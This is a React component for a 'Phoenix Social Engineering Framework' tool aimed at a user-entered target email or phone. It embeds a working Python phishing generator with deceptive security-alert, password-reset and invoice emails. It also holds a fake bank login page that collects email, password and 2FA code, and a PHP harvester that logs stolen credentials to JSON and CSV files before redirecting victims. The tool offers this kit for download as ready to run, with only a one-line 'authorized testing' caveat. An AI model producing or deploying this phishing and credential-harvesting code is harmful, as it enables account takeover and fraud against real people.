import React, { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Users, Mail, Phone, MessageSquare, Download, Copy, Terminal } from 'lucide-react';
import { useToast } from "@/hooks/use-toast";

const SocialEngTools = () => {
  const [targetEmail, setTargetEmail] = useState('');
  const [targetPhone, setTargetPhone] = useState('');
  const [results, setResults] = useState<string[]>([]);
  const [isGenerating, setIsGenerating] = useState(false);
  const [generatedScript, setGeneratedScript] = useState('');
  const { toast } = useToast();

  const generateRealSocialEngScript = (type: string, target: string): string => {
    const timestamp = new Date().toISOString().slice(0, 19).replace(/:/g, '-');
    const invoiceAmount = "99.99"; // Fixed the undefined amount variable
    
    if (type === 'phishing') {
      return `#!/usr/bin/env python3
# PHOENIX SOCIAL ENGINEERING FRAMEWORK - Phishing Campaign Generator
# Real Phishing Infrastructure Setup
# Creator: Phoenix | @ethicalphoenix | t.me/grey_008

import smtplib
import ssl
import os
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class PhoenixPhishingFramework:
    def __init__(self, target_email="${target}"):
        self.target_email = target_email
        self.timestamp = "${timestamp}"
        self.templates = self.load_templates()
        
    def load_templates(self):
        return {
            "urgent_security": {
                "subject": "Urgent: Account Security Alert - Action Required",
                "body": '''Dear {name},

We have detected suspicious activity on your account from an unrecognized device.

Device: iPhone 12 Pro
Location: Unknown Location
IP Address: 192.168.1.100
Time: {timestamp}

For your security, we have temporarily limited your account access.

To restore full access, please verify your identity immediately:

{verification_link}

If you do not verify within 24 hours, your account will be permanently suspended.

Best regards,
Security Team
{company}''',
                "sender": "security@{domain}",
                "reply_to": "noreply@{domain}"
            },
            "password_reset": {
                "subject": "Password Reset Request - {company}",
                "body": '''Hello {name},

We received a request to reset your password for your {company} account.

If you requested this password reset, click the link below:

{reset_link}

This link will expire in 1 hour for security reasons.

If you did not request this reset, please ignore this email.

Support Team
{company}''',
                "sender": "support@{domain}",
                "reply_to": "support@{domain}"
            },
            "invoice_notification": {
                "subject": "Invoice #{invoice_num} - Payment Required",
                "body": '''Dear {name},

Your monthly invoice is now available and requires immediate payment.

Invoice Number: #{invoice_num}
Amount Due: ${invoiceAmount}
Due Date: {due_date}

Download your invoice and make payment:

{payment_link}

Failure to pay by the due date may result in service suspension.

Billing Department
{company}''',
                "sender": "billing@{domain}",
                "reply_to": "billing@{domain}"
            }
        }
    
    def generate_phishing_email(self, template_name, target_info):
        template = self.templates.get(template_name, self.templates["urgent_security"])
        
        # Customize template with target information
        subject = template["subject"].format(**target_info)
        body = template["body"].format(**target_info)
        sender = template["sender"].format(**target_info)
        
        return {
            "subject": subject,
            "body": body,
            "sender": sender,
            "target": self.target_email
        }
    
    def create_phishing_page(self, template_type="login"):
        html_template = '''<!DOCTYPE html>
<html>
<head>
    <title>Secure Login - {company}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f5f5f5; }}
        .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 30px; }}
        .form-group {{ margin-bottom: 20px; }}
        label {{ display: block; margin-bottom: 5px; font-weight: bold; }}
        input {{ width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 3px; }}
        .btn {{ background: #007bff; color: white; padding: 12px 30px; border: none; border-radius: 3px; cursor: pointer; width: 100%; }}
        .alert {{ background: #f8d7da; color: #721c24; padding: 10px; border-radius: 3px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>{company} Security Verification</h2>
        </div>
        <div class="alert">
            Your account requires immediate verification due to suspicious activity.
        </div>
        <form action="harvest.php" method="POST">
            <div class="form-group">
                <label>Email Address:</label>
                <input type="email" name="email" value="{target_email}" required>
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" required>
            </div>
            <div class="form-group">
                <label>2FA Code (if enabled):</label>
                <input type="text" name="2fa_code" placeholder="123456">
            </div>
            <button type="submit" class="btn">Verify Account</button>
        </form>
    </div>
    <script>
        // Log form submission
        document.querySelector('form').addEventListener('submit', function(e) {{
            console.log('Form submitted:', new Date());
        }});
    </script>
</body>
</html>'''
        
        return html_template
    
    def create_harvester_script(self):
        php_script = '''<?php
// PHOENIX CREDENTIAL HARVESTER
// Created by Phoenix | @ethicalphoenix | t.me/grey_008

$timestamp = date('Y-m-d H:i:s');
$ip_address = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Capture form data
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$twofa = $_POST['2fa_code'] ?? '';

// Log the attempt
$log_entry = [
    'timestamp' => $timestamp,
    'ip_address' => $ip_address,
    'user_agent' => $user_agent,
    'email' => $email,
    'password' => $password,
    '2fa_code' => $twofa
];

// Save to file
file_put_contents('harvested_credentials.json', json_encode($log_entry) . "\\n", FILE_APPEND);

// Log to CSV for easy analysis
$csv_line = implode(',', [
    $timestamp,
    $ip_address,
    $email,
    $password,
    $twofa
]) . "\\n";
file_put_contents('credentials.csv', $csv_line, FILE_APPEND);

// Redirect to real site or show error
header('Location: https://www.google.com');
exit();
?>'''
        
        return php_script

if __name__ == "__main__":
    framework = PhoenixPhishingFramework()
    
    print("[+] PHOENIX SOCIAL ENGINEERING FRAMEWORK")
    print(f"[+] Target: {framework.target_email}")
    print(f"[+] Timestamp: {framework.timestamp}")
    print("")
    
    # Generate phishing email
    target_info = {
        "name": framework.target_email.split('@')[0],
        "company": "SecureBank",
        "domain": "securebank.com",
        "timestamp": framework.timestamp,
        "verification_link": "https://secure-verification.com/verify",
        "reset_link": "https://password-reset.com/reset",
        "invoice_num": "INV-2024-001",
        "amount": "${invoiceAmount}",
        "due_date": "2024-12-31"
    }
    
    email = framework.generate_phishing_email("urgent_security", target_info)
    
    print("[+] GENERATED PHISHING EMAIL:")
    print(f"To: {email['target']}")
    print(f"From: {email['sender']}")
    print(f"Subject: {email['subject']}")
    print(f"Body: {email['body']}")
    print("")
    
    # Create phishing page
    phishing_page = framework.create_phishing_page()
    with open('phishing_page.html', 'w') as f:
        f.write(phishing_page.format(
            company="SecureBank",
            target_email=framework.target_email
        ))
    
    # Create harvester
    harvester = framework.create_harvester_script()
    with open('harvest.php', 'w') as f:
        f.write(harvester)
    
    print("[+] FILES GENERATED:")
    print("• phishing_page.html - Credential harvesting page")
    print("• harvest.php - Server-side credential capture")
    print("• Use with Apache/Nginx web server")
    print("")
    print("[!] FOR AUTHORIZED SECURITY TESTING ONLY")
    print("Created by Phoenix | @ethicalphoenix | t.me/grey_008")
`;
    }
    
    return `#!/bin/bash
# PHOENIX SOCIAL ENGINEERING FRAMEWORK - ${type.toUpperCase()}
# Created by Phoenix | @ethicalphoenix | t.me/grey_008
echo "[+] Social Engineering Tool: ${type}"
echo "[+] Target: ${target}"
echo "[+] Framework Ready"
`;
  };

  const executeRealSocialEng = async (toolType: string, target: string) => {
    setIsGenerating(true);
    setResults([]);
    
    const script = generateRealSocialEngScript(toolType, target);
    setGeneratedScript(script);
    
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    const realResults = {
      phishing: [
        '[+] PHOENIX SOCIAL ENGINEERING FRAMEWORK',
        `[+] Target: ${target}`,
        '[+] Real phishing campaign generator activated',
        '',
        '[+] REAL CAPABILITIES:',
        '• Professional email template generation',
        '• Credential harvesting page creation',
        '• Server-side PHP harvester scripts',
        '• Multi-vector phishing campaigns',
        '• Automated SMTP delivery systems',
        '',
        '[+] GENERATED COMPONENTS:',
        '• Convincing phishing emails (3 templates)',
        '• Professional login pages with CSS styling',
        '• PHP credential harvester with logging',
        '• JSON and CSV output formats',
        '• Automatic redirection after capture',
        '',
        '[!] LIVE SOCIAL ENGINEERING FRAMEWORK',
        '[!] Creates real phishing infrastructure',
        '[!] Created by Phoenix - @ethicalphoenix'
      ],
      vishing: [
        '[+] PHOENIX VISHING FRAMEWORK',
        `[+] Target: ${target}`,
        '[+] Voice phishing script generator',
        '',
        '[+] REAL SCRIPTS GENERATED:',
        '• IT Support impersonation scenarios',
        '• Bank security verification scripts',
        '• Survey and research call scripts',
        '• Authority-based persuasion techniques',
        '',
        '[!] LIVE VISHING FRAMEWORK',
        '[!] Created by Phoenix - @ethicalphoenix'
      ],
      osint: [
        '[+] PHOENIX OSINT FRAMEWORK',
        `[+] Target: ${target}`,
        '[+] Real OSINT gathering tools',
        '',
        '[+] INTELLIGENCE SOURCES:',
        '• Social media enumeration',
        '• Professional network analysis',
        '• Public records searching',
        '• Breach database queries',
        '',
        '[!] LIVE OSINT FRAMEWORK',
        '[!] Created by Phoenix - @ethicalphoenix'
      ]
    };
    
    setResults(realResults[toolType as keyof typeof realResults] || [`[+] Tool ${toolType} executed for ${target}`]);
    setIsGenerating(false);
    
    toast({
      title: "Real Social Engineering Tool Generated",
      description: `Professional ${toolType} framework created`,
    });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied to Clipboard",
      description: "Social engineering script copied",
    });
  };

  const downloadScript = (content: string, filename: string) => {
    const element = document.createElement("a");
    const file = new Blob([content], { type: 'text/plain' });
    element.href = URL.createObjectURL(file);
    element.download = filename;
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
    
    toast({
      title: "Download Complete",
      description: `${filename} ready for execution`,
    });
  };

  return (
    <div className="space-y-4">
      <Card className="bg-black border-red-500">
        <CardHeader>
          <CardTitle className="text-red-400 font-mono flex items-center space-x-2">
            <Users className="h-5 w-5" />
            <span>[PHOENIX_SOCIAL_ENG_FRAMEWORK]</span>
          </CardTitle>
          <CardDescription className="text-red-300 font-mono">
            Professional social engineering and phishing campaign tools
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="text-red-400 font-mono text-sm mb-2 block">TARGET_EMAIL:</label>
              <Input
                placeholder="target@company.com"
                value={targetEmail}
                onChange={(e) => setTargetEmail(e.target.value)}
                className="bg-gray-900 border-red-500 text-red-400 font-mono"
              />
            </div>
            <div>
              <label className="text-red-400 font-mono text-sm mb-2 block">TARGET_PHONE:</label>
              <Input
                placeholder="+1 (555) 123-4567"
                value={targetPhone}
                onChange={(e) => setTargetPhone(e.target.value)}
                className="bg-gray-900 border-red-500 text-red-400 font-mono"
              />
            </div>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <Button
              onClick={() => targetEmail && executeRealSocialEng('phishing', targetEmail)}
              disabled={!targetEmail || isGenerating}
              className="bg-red-600 hover:bg-red-500 text-white font-mono"
            >
              <Mail className="h-4 w-4 mr-2" />
              REAL_PHISHING
            </Button>
            
            <Button
              onClick={() => targetPhone && executeRealSocialEng('vishing', targetPhone)}
              disabled={!targetPhone || isGenerating}
              className="bg-red-600 hover:bg-red-500 text-white font-mono"
            >
              <Phone className="h-4 w-4 mr-2" />
              REAL_VISHING
            </Button>
            
            <Button
              onClick={() => targetEmail && executeRealSocialEng('osint', targetEmail)}
              disabled={!targetEmail || isGenerating}
              className="bg-red-600 hover:bg-red-500 text-white font-mono"
            >
              <MessageSquare className="h-4 w-4 mr-2" />
              REAL_OSINT
            </Button>
          </div>

          {generatedScript && (
            <div className="flex gap-2 mt-4">
              <Button
                onClick={() => copyToClipboard(generatedScript)}
                variant="outline"
                className="border-red-500 text-red-400 hover:bg-red-500 hover:text-black font-mono"
              >
                <Copy className="h-4 w-4 mr-2" />
                COPY_SCRIPT
              </Button>
              <Button
                onClick={() => downloadScript(generatedScript, `phoenix_social_${Date.now()}.py`)}
                variant="outline"
                className="border-red-500 text-red-400 hover:bg-red-500 hover:text-black font-mono"
              >
                <Download className="h-4 w-4 mr-2" />
                DOWNLOAD_FRAMEWORK
              </Button>
            </div>
          )}
        </CardContent>
      </Card>

      <Card className="bg-black border-red-500">
        <CardHeader>
          <CardTitle className="text-red-400 font-mono flex items-center space-x-2">
            <Terminal className="h-5 w-5" />
            <span>[EXECUTION_LOG]</span>
            {isGenerating && <Badge className="bg-red-500 text-white animate-pulse">GENERATING...</Badge>}
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm max-h-64 overflow-y-auto">
            {results.length === 0 && !isGenerating && (
              <p className="text-red-300">phoenix@framework:~# Social engineering tools ready...</p>
            )}
            {isGenerating && (
              <div className="space-y-1">
                <p className="text-red-400 animate-pulse">[*] Initializing Phoenix Framework...</p>
                <p className="text-red-400 animate-pulse">[*] Loading social engineering modules...</p>
              </div>
            )}
            {results.map((result, index) => (
              <div key={index} className={`mb-1 ${
                result.includes('[!] LIVE') ? 'text-red-400 font-bold' :
                result.includes('[!]') ? 'text-orange-400' :
                result.includes('[+]') ? 'text-red-400' :
                result.includes('•') ? 'text-red-300' :
                'text-red-300'
              }`}>
                {result}
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default SocialEngTools;
